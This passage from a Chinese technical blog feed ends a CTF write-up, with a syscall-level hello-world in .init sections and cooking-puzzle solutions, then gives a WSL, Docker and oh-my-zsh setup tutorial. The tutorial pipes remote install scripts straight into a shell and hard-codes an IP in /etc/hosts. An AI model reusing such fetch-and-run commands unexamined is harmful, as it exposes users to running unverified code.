class="built_in">putchar</span>(<span class="string">'w'</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">'o'</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">'r'</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">'l'</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">'d'</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">'!'</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="记忆清除"><a class="markdownIt-Anchor" href="#记忆清除"></a> 记忆清除</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__((used, constructor, section(<span class="string">".init"</span>))) <span class="function"><span class="keyword">void</span> <span class="title">pre_array</span><span class="params">()</span></span>; </span><br><span class="line"><span class="keyword">void</span> _start() __attribute__((section(<span class="string">".init"</span>)));</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">my_write</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *buf)</span> __<span class="title">attribute__</span><span class="params">((section(<span class="string">".init"</span>)))</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">my_write</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = STDOUT_FILENO;</span><br><span class="line">    <span class="keyword">ssize_t</span> ret;</span><br><span class="line">    <span class="keyword">size_t</span> <span class="built_in">size</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="string">"int $0x80"</span></span></span></span><br><span class="line"><span class="function"><span class="params">        : <span class="string">"=a"</span>(ret)</span></span></span><br><span class="line"><span class="function"><span class="params">        : <span class="string">"0"</span>(__NR_write), <span class="string">"b"</span>(fd), <span class="string">"c"</span>(buf), <span class="string">"d"</span>(<span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"><span class="params">        : <span class="string">"memory"</span> <span class="comment">// the kernel dereferences pointer args</span></span></span></span><br><span class="line"><span class="function"><span class="params">    )</span></span>;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pre_array</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="keyword">char</span> test1 = <span class="string">'H'</span>;</span><br><span class="line">    my_write((<span class="keyword">const</span> <span class="keyword">void</span> *)&amp;test1);</span><br><span class="line">    test1 = <span class="string">'e'</span>;</span><br><span class="line">    my_write((<span class="keyword">const</span> <span class="keyword">void</span> *)&amp;test1);</span><br><span class="line">    test1 = <span class="string">'l'</span>;</span><br><span class="line">    my_write((<span class="keyword">const</span> <span class="keyword">void</span> *)&amp;test1);</span><br><span class="line">    test1 = <span class="string">'l'</span>;</span><br><span class="line">    my_write((<span class="keyword">const</span> <span class="keyword">void</span> *)&amp;test1);</span><br><span class="line">    test1 = <span class="string">'o'</span>;</span><br><span class="line">    my_write((<span class="keyword">const</span> <span class="keyword">void</span> *)&amp;test1);</span><br><span class="line">    test1 = <span class="string">','</span>;</span><br><span class="line">    my_write((<span class="keyword">const</span> <span class="keyword">void</span> *)&amp;test1);</span><br><span class="line">    test1 = <span class="string">' '</span>;</span><br><span class="line">    my_write((<span class="keyword">const</span> <span class="keyword">void</span> *)&amp;test1);</span><br><span class="line">    test1 = <span class="string">'w'</span>;</span><br><span class="line">    my_write((<span class="keyword">const</span> <span class="keyword">void</span> *)&amp;test1);</span><br><span class="line">    test1 = <span class="string">'o'</span>;</span><br><span class="line">    my_write((<span class="keyword">const</span> <span class="keyword">void</span> *)&amp;test1);</span><br><span class="line">    test1 = <span class="string">'r'</span>;</span><br><span class="line">    my_write((<span class="keyword">const</span> <span class="keyword">void</span> *)&amp;test1);</span><br><span class="line">    test1 = <span class="string">'l'</span>;</span><br><span class="line">    my_write((<span class="keyword">const</span> <span class="keyword">void</span> *)&amp;test1);</span><br><span class="line">    test1 = <span class="string">'d'</span>;</span><br><span class="line">    my_write((<span class="keyword">const</span> <span class="keyword">void</span> *)&amp;test1);</span><br><span class="line">    test1 = <span class="string">'!'</span>;</span><br><span class="line">    my_write((<span class="keyword">const</span> <span class="keyword">void</span> *)&amp;test1);</span><br><span class="line">    <span class="comment">/* exit system call */</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"movl $1,%eax;"</span></span><br><span class="line">        <span class="string">"xorl %ebx,%ebx;"</span></span><br><span class="line">        <span class="string">"int  $0x80"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*<span class="keyword">init_array_t</span>)</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="keyword">init_array_t</span> __attribute__ ((section(<span class="string">".preinit_array"</span>))) my_init_a1 = pre_array;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="10-图之上的信息"><a class="markdownIt-Anchor" href="#10-图之上的信息"></a> 10 图之上的信息</h1><h1 id="11-easy-rsa"><a class="markdownIt-Anchor" href="#11-easy-rsa"></a> 11 Easy RSA</h1><h1 id="12-加密的-u-盘"><a class="markdownIt-Anchor" href="#12-加密的-u-盘"></a> 12 加密的 U 盘</h1><h1 id="13-赛博厨房"><a class="markdownIt-Anchor" href="#13-赛博厨房"></a> 13 赛博厨房</h1><h2 id="level-0"><a class="markdownIt-Anchor" href="#level-0"></a> Level 0</h2><p>自然语言编程，按照每天给出的条件编程即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">向右 2 步</span><br><span class="line">拿起 1 个物品</span><br><span class="line">向下 1 步</span><br><span class="line">向左 2 步</span><br><span class="line">放下 1 个物品</span><br><span class="line">向右 1 步</span><br><span class="line">向上 1 步</span><br><span class="line">拿起 1 个物品</span><br><span class="line">向下 1 步</span><br><span class="line">向左 1 步</span><br><span class="line">放下 1 个物品</span><br></pre></td></tr></table></figure><h2 id="level-1"><a class="markdownIt-Anchor" href="#level-1"></a> Level 1</h2><p><code>do...while</code>循环思路</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">向右 1 步</span><br><span class="line">拿起 73 个物品</span><br><span class="line">向下 1 步</span><br><span class="line">向左 1 步</span><br><span class="line">放下 1 个物品</span><br><span class="line">如果手上的物品大于等于 0 向上跳转 1 行</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Win10安装Ubuntu子系统</title>
      <link href="/2021/10/27/Win10%E5%AE%89%E8%A3%85Ubuntu%E5%AD%90%E7%B3%BB%E7%BB%9F/"/>
      <url>/2021/10/27/Win10%E5%AE%89%E8%A3%85Ubuntu%E5%AD%90%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="0-情景导入"><a class="markdownIt-Anchor" href="#0-情景导入"></a> 0 情景导入</h1><ol><li>在Windows10 Home版操作系统下安装Linux子系统(WSL2)，用于轻量需求，方便快捷。</li><li>在微软商店内安装Linux子系统会默认安装到C盘，根据官方文档指示可以安装到其他盘（未成功）。</li><li>自定义Linux子系统，安装到非C盘。</li></ol><h1 id="1-安装wsl2未成功"><a class="markdownIt-Anchor" href="#1-安装wsl2未成功"></a> 1 安装WSL2（未成功）</h1><blockquote><ul><li><a href="https://docs.microsoft.com/zh-cn/windows/wsl/install-win10" target="_blank" rel="noopener">微软WSL官方安装文档（中文）</a></li><li><a href="https://docs.microsoft.com/en-us/windows/wsl/install-manual#downloading-distros" target="_blank" rel="noopener">微软WSL官方安装文档（英文）</a></li></ul></blockquote><h2 id="11-启用windows子系统功能"><a class="markdownIt-Anchor" href="#11-启用windows子系统功能"></a> 1.1 启用<code>Windows子系统</code>功能</h2><p>在安装子系统之前，启用<code>Windows子系统</code>功能，在Windows10的Powershell中输入：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dism.exe /online /<span class="built_in">enable-feature</span> /featurename:Microsoft<span class="literal">-Windows</span><span class="literal">-Subsystem</span><span class="literal">-Linux</span> /all /norestart</span><br></pre></td></tr></table></figure><h2 id="12-检查wsl2依赖是否满足"><a class="markdownIt-Anchor" href="#12-检查wsl2依赖是否满足"></a> 1.2 检查WSL2依赖是否满足</h2><ul><li>For x64 systems: <strong>Version 1903</strong> or higher, with <strong>Build 18362</strong> or higher.</li><li>For ARM64 systems: <strong>Version 2004</strong> or higher, with <strong>Build 19041</strong> or higher.</li><li>Builds lower than 18362 do not support WSL 2. Use the <a href="https://www.microsoft.com/software-download/windows10" target="_blank" rel="noopener">Windows Update Assistant</a> to update your version of Windows.</li></ul><p>检查Windows版本：<code>win+R</code>，输入<code>winver</code></p><h2 id="13-启用虚拟机功能"><a class="markdownIt-Anchor" href="#13-启用虚拟机功能"></a> 1.3 启用<code>虚拟机</code>功能</h2><p>管理员模式打开Powershell：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dism.exe /online /<span class="built_in">enable-feature</span> /featurename:VirtualMachinePlatform /all /norestart</span><br></pre></td></tr></table></figure><h2 id="14-下载linux内核更新包"><a class="markdownIt-Anchor" href="#14-下载linux内核更新包"></a> 1.4 下载Linux内核更新包</h2><ol><li>下载最新安装包：<a href="https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi" target="_blank" rel="noopener">跳转</a></li><li>点击安装上述的安装包</li></ol><h2 id="15-将-wsl-2-设置为默认版本"><a class="markdownIt-Anchor" href="#15-将-wsl-2-设置为默认版本"></a> 1.5 将 WSL 2 设置为默认版本</h2><p>在Powershell中运行：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl -<span class="literal">-set</span><span class="literal">-default</span><span class="literal">-version</span> <span class="number">2</span></span><br></pre></td></tr></table></figure><h2 id="16-安装linux发行版"><a class="markdownIt-Anchor" href="#16-安装linux发行版"></a> 1.6 安装Linux发行版</h2><h3 id="161-微软商店安装只能安装在c盘"><a class="markdownIt-Anchor" href="#161-微软商店安装只能安装在c盘"></a> 1.6.1 微软商店安装（只能安装在C盘）</h3><h3 id="162-命令行安装可以安装在其他盘"><a class="markdownIt-Anchor" href="#162-命令行安装可以安装在其他盘"></a> 1.6.2 命令行安装（可以安装在其他盘）</h3><ol><li><p>cmd下，在自定义目录中下载：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl.exe -L -o ubuntu-1604.appx https://aka.ms/wsl-ubuntu-2004</span><br></pre></td></tr></table></figure></li><li><p>安装：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Add-AppxPackage .\app_name.appx</span><br></pre></td></tr></table></figure><p><font color="red">但是出错：</font></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PS D:\virtual_machine\WSL\Ubuntu&gt; Add-AppxPackage .\Ubuntu2004.appx</span><br><span class="line">Add-AppxPackage : 部署失败，原因是 HRESULT: 0x80073CF3, 包无法进行更新、相关性或冲突验证。</span><br><span class="line">从  (Ubuntu2004.appx)  使用程序包 CanonicalGroupLimited.Ubuntu20.04onWindows_2004.2020.424.0_x64__79rhkp1fndgsc 中的目</span><br><span class="line">标卷 C: 执行的部署 Add 操作失败，错误为 0x80073CF3。有关诊断应用部署问题的帮助，请参阅 http://go.microsoft.com/fwlink/?</span><br><span class="line">LinkId=235160。</span><br><span class="line">注意: 有关其他信息，请在事件日志中查找 [ActivityId] a0925605-afc5-0005-a072-92a0c5afd701，或使用命令行 Get-AppPackageLo</span><br><span class="line">g -ActivityID a0925605-afc5-0005-a072-92a0c5afd701</span><br><span class="line">所在位置 行:1 字符: 1</span><br><span class="line">+ Add-AppxPackage .\Ubuntu2004.appx</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : WriteError: (D:\virtual_mach...Ubuntu2004.appx:String) [Add-AppxPackage], IOException</span><br><span class="line">    + FullyQualifiedErrorId : DeploymentError,Microsoft.Windows.Appx.PackageManager.Commands.AddAppxPackageCommand</span><br></pre></td></tr></table></figure><p><a href="https://answers.microsoft.com/zh-hans/windows/forum/all/add-appxpackage-0x80073cfd/1303974b-3ea0-4436-8cb5-20675b1338c3" target="_blank" rel="noopener">问题解决</a>，应该是home版的windows有关，暂时没有解决。</p></li></ol><hr><h1 id="2-安装自定义系统成功"><a class="markdownIt-Anchor" href="#2-安装自定义系统成功"></a> 2 安装自定义系统（成功）</h1><blockquote><ul><li><a href="https://docs.microsoft.com/zh-cn/windows/wsl/use-custom-distro" target="_blank" rel="noopener">微软WSL官方安装文档（中文）</a></li></ul><p>安装后的问题：</p><ol><li><code>ping baidu.com</code>反应慢，<code>ping 8.8.8.8</code>还可以</li><li></li></ol></blockquote><h2 id="21-从容器中导出-tar"><a class="markdownIt-Anchor" href="#21-从容器中导出-tar"></a> 2.1 从容器中导出 tar</h2><p>在Ubuntu虚拟机中进行操作：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装docker</span></span><br><span class="line"><span class="comment"># https://www.runoob.com/docker/ubuntu-docker-install.html</span></span><br><span class="line">curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</span><br><span class="line"><span class="comment"># 启动 Docker 服务</span></span><br><span class="line">sudo service docker start</span><br><span class="line"><span class="comment"># 下载指定系统镜像</span></span><br><span class="line">sudo docker pull registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0</span><br><span class="line"><span class="comment"># 查看系统镜像</span></span><br><span class="line">sudo docker images</span><br><span class="line"><span class="comment"># 使用 ubuntu 镜像启动一个容器，参数为以命令行模式进入该容器</span></span><br><span class="line">sudo docker run -it ImageID /bin/bash</span><br><span class="line"><span class="comment"># 启动容器</span></span><br><span class="line">sudo docker start ContainerID</span><br><span class="line"><span class="comment"># 查看容器</span></span><br><span class="line">sudo docker ps -a</span><br><span class="line"><span class="comment"># 进入容器</span></span><br><span class="line">sudo docker attach ContainerID</span><br><span class="line"><span class="comment"># 使用 grep 和 awk 获取 CentOS 容器 ID</span></span><br><span class="line">dockerContainerID=$(sudo docker container ls -a | grep -i &#123;容器名称&#125; | awk <span class="string">'&#123;print $1&#125;'</span>)</span><br><span class="line"><span class="comment"># 根据容器 ID 导出 tar 文件：</span></span><br><span class="line">sudo docker <span class="built_in">export</span> <span class="variable">$dockerContainerID</span> &gt; ubuntu.tar</span><br></pre></td></tr></table></figure><h2 id="22-将-tar-文件导入-wsl"><a class="markdownIt-Anchor" href="#22-将-tar-文件导入-wsl"></a> 2.2 将 tar 文件导入 WSL</h2><p>在Windows的powershell中操作：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在选定目录下导入 tar 文件： wsl --import &lt;DistroName&gt; &lt;InstallLocation&gt; &lt;InstallTarFile&gt;</span></span><br><span class="line">wsl --import Ubuntu .\Ubuntu .\ubuntu.tar</span><br><span class="line"><span class="comment"># 检查已安装的子系统实例</span></span><br><span class="line">wsl -l -v</span><br><span class="line"><span class="comment"># 启动Ubuntu子系统</span></span><br><span class="line">wsl -d Ubuntu</span><br><span class="line"><span class="comment"># 停止Ubuntu子系统</span></span><br><span class="line">wsl --terminate Ubuntu <span class="comment">#停止</span></span><br><span class="line"><span class="comment"># 卸载Ubuntu子系统</span></span><br><span class="line">wsl --unregister Ubuntu</span><br></pre></td></tr></table></figure><h1 id="3-安装terminus终端"><a class="markdownIt-Anchor" href="#3-安装terminus终端"></a> 3 安装Terminus终端</h1><ol><li><p><strong>Terminus</strong>下载安装，点击<code>设置</code>，修改<code>Profiles</code>，使得默认标签页打开wsl（Ubuntu）</p><img src="https://i.loli.net/2021/09/26/FewNKTpMnikjZ8b.png" width="700" height="400" alt="图片名称" align="center" id="33"></li><li><p>将Tabby(<strong>Terminus</strong>)添加到右键打开：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">set</span> ICON=D:\software\terminus\soft\Tabby\Tabby.exe <span class="comment">#改成自己的</span></span><br><span class="line"><span class="built_in">set</span> LABEL=Open terminal here</span><br><span class="line"><span class="built_in">set</span> COMMAND=D:\software\terminus\soft\Tabby\Tabby.exe \"%%V\" <span class="comment">#改成自己的</span></span><br><span class="line"><span class="built_in">set</span> SLUG=Terminal</span><br><span class="line"></span><br><span class="line">reg delete <span class="string">"HKCU\Software\Classes\Directory\Background\shell\%SLUG%"</span> /f</span><br><span class="line">reg delete <span class="string">"HKCU\Software\Classes\Directory\shell\%SLUG%"</span> /f</span><br><span class="line">reg delete <span class="string">"HKCU\Software\Classes\Drive\shell\%SLUG%"</span> /f</span><br><span class="line">reg delete <span class="string">"HKCU\Software\Classes\LibraryFolder\Background\shell\%SLUG%"</span> /f</span><br><span class="line"></span><br><span class="line">reg add <span class="string">"HKCU\Software\Classes\Directory\Background\shell\%SLUG%"</span> /f /ve /t REG_SZ /d <span class="string">"%LABEL%"</span></span><br><span class="line"></span><br><span class="line">reg add <span class="string">"HKCU\Software\Classes\Directory\Background\shell\%SLUG%"</span> /f /v <span class="string">"Icon"</span> /t REG_SZ /d <span class="string">"%ICON%"</span></span><br><span class="line">reg add <span class="string">"HKCU\Software\Classes\Directory\Background\shell\%SLUG%\command"</span> /f /ve /t REG_SZ /d <span class="string">"%COMMAND%"</span></span><br><span class="line">reg add <span class="string">"HKCU\Software\Classes\Directory\shell\%SLUG%"</span> /f /ve /t REG_SZ /d <span class="string">"%LABEL%"</span></span><br><span class="line"></span><br><span class="line">reg add <span class="string">"HKCU\Software\Classes\Directory\shell\%SLUG%"</span> /f /v <span class="string">"Icon"</span> /t REG_SZ /d <span class="string">"%ICON%"</span></span><br><span class="line">reg add <span class="string">"HKCU\Software\Classes\Directory\shell\%SLUG%\command"</span> /f /ve /t REG_SZ /d <span class="string">"%COMMAND%"</span></span><br><span class="line">reg add <span class="string">"HKCU\Software\Classes\Drive\shell\%SLUG%"</span> /f /ve /t REG_SZ /d <span class="string">"%LABEL%"</span></span><br><span class="line"></span><br><span class="line">reg add <span class="string">"HKCU\Software\Classes\Drive\shell\%SLUG%"</span> /f /v <span class="string">"Icon"</span> /t REG_SZ /d <span class="string">"%ICON%"</span></span><br><span class="line">reg add <span class="string">"HKCU\Software\Classes\Drive\shell\%SLUG%\command"</span> /f /ve /t REG_SZ /d <span class="string">"%COMMAND%"</span></span><br><span class="line">reg add <span class="string">"HKCU\Software\Classes\LibraryFolder\Background\shell\%SLUG%"</span> /f /ve /t REG_SZ /d <span class="string">"%LABEL%"</span></span><br><span class="line"></span><br><span class="line">reg add <span class="string">"HKCU\Software\Classes\LibraryFolder\Background\shell\%SLUG%"</span> /f /v <span class="string">"Icon"</span> /t REG_SZ /d <span class="string">"%ICON%"</span></span><br><span class="line">reg add <span class="string">"HKCU\Software\Classes\LibraryFolder\Background\shell\%SLUG%\command"</span> /f /ve /t REG_SZ /d <span class="string">"%COMMAND%"</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="4-配置oh-my-zsh"><a class="markdownIt-Anchor" href="#4-配置oh-my-zsh"></a> 4 配置oh-my-zsh</h1><p>zsh是一个Linux下强大的shell, 由于大多数Linux产品安装以及默认使用bash shell, 但是丝毫不影响极客们对zsh的热衷, 几乎每一款Linux产品都包含有zsh，通常可以用apt-get、urpmi或yum等包管理器进行安装。</p><p>zsh是bash的增强版，其实zsh和bash是两个不同的概念，zsh更加强大。</p><p>通常zsh配置起来非常麻烦，且相当的复杂，所以oh-my-zsh是为了简化zsh的配置而开发的，因此oh-my-zsh算是zsh的配置。</p><h2 id="41-安装zsh"><a class="markdownIt-Anchor" href="#41-安装zsh"></a> 4.1 安装zsh</h2><ol><li><p>安装zsh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install zsh -y</span><br></pre></td></tr></table></figure></li><li><p>检查安装是否成功：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/shells</span><br><span class="line"><span class="comment"># /etc/shells: valid login shells</span></span><br><span class="line">/bin/sh</span><br><span class="line">/bin/bash</span><br><span class="line">/bin/rbash</span><br><span class="line">/bin/dash</span><br><span class="line">/usr/bin/tmux</span><br><span class="line">/bin/zsh</span><br><span class="line">/usr/bin/zsh</span><br></pre></td></tr></table></figure></li><li><p>zsh设为默认shell，新开标签页生效</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure></li></ol><h2 id="42-oh-my-zsh安装与配置"><a class="markdownIt-Anchor" href="#42-oh-my-zsh安装与配置"></a> 4.2 oh-my-zsh安装与配置</h2><blockquote><ul><li><a href="https://www.jianshu.com/p/ba782b57ae96" target="_blank" rel="noopener">Ubuntu | 安装oh-my-zsh</a></li></ul></blockquote><ol><li><p>安装：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">"<span class="variable">$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>"</span></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">sh -c <span class="string">"<span class="variable">$(wget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)</span>"</span></span><br></pre></td></tr></table></figure><p>出现安装报错：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl: (7) Failed to connect to raw.githubusercontent.com port 443: Connection refused</span><br></pre></td></tr></table></figure><p><strong>解决</strong>：</p><ul><li><p>如果科学上网应该不会出现此情况；</p></li><li><p>如果不能科学上网可以这样做：</p><ul><li><p>打开网站: <code>https://www.ipaddress.com/</code>， 查询一下 <code>raw.githubusercontent.com</code>对应的IP 地址</p></li><li><p>在hosts文件中添加：<code>sudo vim /etc/hosts</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">199.232.28.133 raw.githubusercontent.com</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>主题使用robbyrussell，<code>vim ~/.zshrc</code></p><img src="https://i.loli.net/2021/09/26/CyOAqiXPmTRYFvz.png" width="700" height="300" alt="图片名称" align="center" id="34"></li><li><p>安装插件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改配置文件 </span></span><br><span class="line">vim ~/.zshrc</span><br><span class="line"><span class="comment">## 添加内容</span></span><br><span class="line">plugins=(git zsh-autosuggestions zsh-syntax-highlighting autojump extract)</span><br><span class="line"><span class="comment"># 解压插件，解压一个命令x全搞定</span></span><br><span class="line">extract <span class="comment"># 不用安装</span></span><br><span class="line"><span class="comment"># 安装autojump自动跳转插件</span></span><br><span class="line">apt install autojump</span><br><span class="line"><span class="comment"># 安装zsh-autosuggestions语法历史记录插件</span></span><br><span class="line">git <span class="built_in">clone</span> git://github.com/zsh-users/zsh-autosuggestions <span class="variable">$ZSH_CUSTOM</span>/plugins/zsh-autosuggestions</span><br><span class="line"><span class="comment"># 安装zsh-syntax-highlighting语法高亮插件</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$ZSH_CUSTOM</span>/plugins/zsh-syntax-highlighting</span><br><span class="line"><span class="comment"># 配置文件生效</span></span><br><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> 环境与工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>物理机安装Ubuntu+Win10双系统</title>
      <link href="/2021/10/27/%E5%AE%89%E8%A3%85Ubuntu%E7%89%A9%E7%90%86%E6%9C%BA(Win10+Ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F)/"/>
      <url>/2021/10/27/%E5%AE%89%E8%A3%85Ubuntu%E7%89%A9%E7%90%86%E6%9C%BA(Win10+Ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F)/</url>
      
